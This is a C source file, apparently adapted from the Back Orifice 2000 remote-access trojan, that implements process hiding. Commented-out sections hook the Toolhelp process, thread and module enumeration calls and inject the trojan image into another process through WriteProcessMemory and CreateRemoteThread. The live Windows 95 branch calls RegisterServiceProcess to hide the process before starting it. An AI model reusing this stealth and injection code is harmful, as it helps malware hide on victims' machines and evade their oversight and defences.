
#include	<windows.h>
#include	<main.h>
//  #include	<bo_debug.h>
//  #include	<osversion.h>
#include	<dll_load.h>
//  #include	<pviewer.h>
#include	<process_hop.h>
#include	<config.h>
#include	<ras.h>
#include	<raserror.h>
#include	<iphlpapi.h>

#include	"qyCommon.h"
#include	"qnmPcComm.h"
#include	"showPcProcess.h"

#include	"asrWMon.h"

// --------------------- Code to hide Win95 processes ----------------------
/*

void __declspec(naked) StartOfHappyCode(void)
{
}


BOOL WINAPI FakeProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
	if(((PROCESSWALK)0x22222222)(hSnapshot, lppe)==FALSE) return FALSE;
	while(lppe->th32ProcessID==0x11111111) {
		if(((PROCESSWALK)0x33333333)(hSnapshot, lppe)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)
{
	if(((PROCESSWALK)0x33333333)(hSnapshot, lppe)==FALSE) return FALSE;
	while(lppe->th32ProcessID==0x11111111) {
		if(((PROCESSWALK)0x33333333)(hSnapshot, lppe)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeThread32First(HANDLE hSnapshot, LPTHREADENTRY32 lpte)
{
	if(((THREADWALK)0x44444444)(hSnapshot, lpte)==FALSE) return FALSE;
	while(lpte->th32OwnerProcessID==0x11111111) {
		if(((THREADWALK)0x55555555)(hSnapshot, lpte)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeThread32Next(HANDLE hSnapshot, LPTHREADENTRY32 lpte)
{
	if(((THREADWALK)0x55555555)(hSnapshot, lpte)==FALSE) return FALSE;
	while(lpte->th32OwnerProcessID==0x11111111) {
		if(((THREADWALK)0x55555555)(hSnapshot, lpte)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeModule32First(HANDLE hSnapshot, LPMODULEENTRY32 lpme)
{
	if(((MODULEWALK)0x66666666)(hSnapshot, lpme)==FALSE) return FALSE;
	while(lpme->th32ProcessID==0x11111111) {
		if(((MODULEWALK)0x77777777)(hSnapshot, lpme)==FALSE) return FALSE;
	}
	return TRUE;
}

BOOL WINAPI FakeModule32Next(HANDLE hSnapshot, LPMODULEENTRY32 lpme)
{
	if(((MODULEWALK)0x77777777)(hSnapshot, lpme)==FALSE) return FALSE;
	while(lpme->th32ProcessID==0x11111111) {
		if(((MODULEWALK)0x77777777)(hSnapshot, lpme)==FALSE) return FALSE;
	}
	return TRUE;
}
*/
/*
void __declspec(naked) EndOfHappyCode(void)
{
}
*/


 BOOL SpawnBO2KThread(char *svProcess)
{
	HANDLE hMutex = NULL;
	//  char mutexName[256];

	traceLogA(  "SpawnThread enters."  );
	
	if  (  g_bIsWinNT  )  {  //---------------------- WINDOWS NT PROCESS HIDE -------------------
		// -------------------------------------------------------
		// -- Process Hiding Code                               
		// -- Note that there are several different ways to do  
		// -- what this code does. Both of the methods presented
		// -- below were written specifically to avoid accessing
		// -- the original BO2K image on disk.
		// -- This way, the original BO2K disk file can be compressed
		// -- with all of the plugin attachments inside, and
		// -- the original executable can be moved around/deleted
		// -- while the BO2K server still runs.
		
		// Get another process and thread id		

		/*
		PROCESSINFO *ppie,*ppi=CreateProcListSnapshot(NULL);
		DWORD dwThreadID, dwProcID;

		for  (  ppie  =  ppi;  ppie  !=  NULL;  ppie  =  ppie->next  )  {
			if  (  lstrcmpi(  ppie->svApp,  svProcess  )  ==  0  )  break;
		}
		if  (  ppie  ==  NULL  ) {
			traceLogA( "0416-SpawnBO2KThread() WinNT OS ppie=NULL."  );
			return  FALSE;
		}
		
		dwProcID  =  ppie->dwProcID;
		dwThreadID  =  ppie->pThread->dwThreadID; // Get first thread (doesn't really matter)
		
		DestroyProcListSnapshot(  ppi  );
		
		// Make sure we aren't hopping into ourselves
		if  (  GetCurrentProcessId(  )  ==  dwProcID  ) return FALSE;

		if  (  g_bIsWinNT  )  wsprintf( mutexName, "%s%lu", DEFAULT_qwmMutexName,  dwProcID  );			
		else  wsprintf(  mutexName,  "%s",  DEFAULT_qwmMutexName  );
		traceLogA(  "SpawnThread( ) has created mutex: [%s]",  mutexName  );

		hMutex = CreateMutex( NULL, TRUE, mutexName );
		if ( !hMutex || GetLastError( ) == ERROR_ALREADY_EXISTS ) {
			traceLogA(  "SpawnThread( ): CreateMutex( ) failed. Maybe another thread has been running, so this thread must be quit."  );
			if ( hMutex ) CloseHandle( hMutex );
			return FALSE;
		}
		CloseHandle(  hMutex  );  hMutex  =  NULL;

		// Open process to inject code into
		HANDLE  hProc  =  OpenProcess(  PROCESS_ALL_ACCESS,  FALSE,  dwProcID  );
		if  (  hProc  ==  NULL  )  {
			traceLogA(  "Unable to open process."  );
			return FALSE;
		}
		
		// Free space for BO2K (in case we are restarting)
		pVirtualFreeEx(  hProc,  g_module,  0,  MEM_RELEASE  );
		
		// Allocate space for BO2K to fit in the process
		DWORD  dwSize  =  (  (  PIMAGE_OPTIONAL_HEADER  )OPTHDROFFSET(  g_module  )  )->SizeOfImage;
		char  *  pMem  =  (  char  *  )pVirtualAllocEx(  hProc,  g_module,  dwSize,  MEM_COMMIT | MEM_RESERVE,  PAGE_EXECUTE_READWRITE  );
		if  (  pMem  ==  NULL  )  {
			qyDisplayLastError(  "Couldn't VirtualAllocEx."  );
			return  FALSE;
		}
		
		// Lets copy the entire bo2k process into this space.
		DWORD dwOldProt,dwNumBytes,i;
		MEMORY_BASIC_INFORMATION mbi;
		
		pVirtualQueryEx(hProc,pMem,&mbi,sizeof(MEMORY_BASIC_INFORMATION));
		while(mbi.Protect!=PAGE_NOACCESS && mbi.RegionSize!=0) {
			if(!(mbi.Protect & PAGE_GUARD)) {
				for(i=0;i<mbi.RegionSize;i+=0x1000) {
					pVirtualProtectEx(hProc,pMem+i,0x1000,PAGE_EXECUTE_READWRITE,&dwOldProt);
					WriteProcessMemory(hProc,pMem+i,pMem+i,0x1000,&dwNumBytes);
				}
			}
			
			pMem+=mbi.RegionSize;
			pVirtualQueryEx(hProc,pMem,&mbi,sizeof(MEMORY_BASIC_INFORMATION));	
		}
		
		traceLogA(  "Now call CreateRemoteThread( )."  );

		// Create a remote thread in the other process

		DWORD dwRmtThdID;
		HANDLE hRmtThd=pCreateRemoteThread(hProc,NULL,0,EntryPoint,(LPVOID)g_module,0,&dwRmtThdID);
		if  (  hRmtThd  ==  NULL  )  {
			DebugMessageBox(NULL,"Could create remote thread","ERROR",MB_SETFOREGROUND);
			return FALSE;
		}
				
		CloseHandle(hProc);
		*/
		traceLogA(  "SpawmThread: 最严重警告：很多都封掉了，不应再在这里运行了，here"  );

		return 0;
		
		} 
	else { //---------------------------------- WINDOWS 95 PROCESS HIDE -------------
		// This one works differently because we don't necessarily have
		// the functionality to do a 'CreateRemoteThread()'. And for 
		// various reasons, hijacking another thread and changing its
		// context to do your bidding doens't really work. It's because
		// the thread you hijack may be blocked on a mutex/semaphore/etc
		// and won't resume execution to run your code until the blocking
		// ID is signaled by the system. So, we have to just hack kernel32.dll
		// to forget that our process exists :)

		// Start up PE Image Loader
		(  (  QWM_DYN_LIB  *  )gQyWMon.env.pDynLibs  )->pRegisterServiceProcess(NULL,1);
	
		EntryPoint(GetModuleHandle(NULL));
		

	}


	return TRUE;
}	



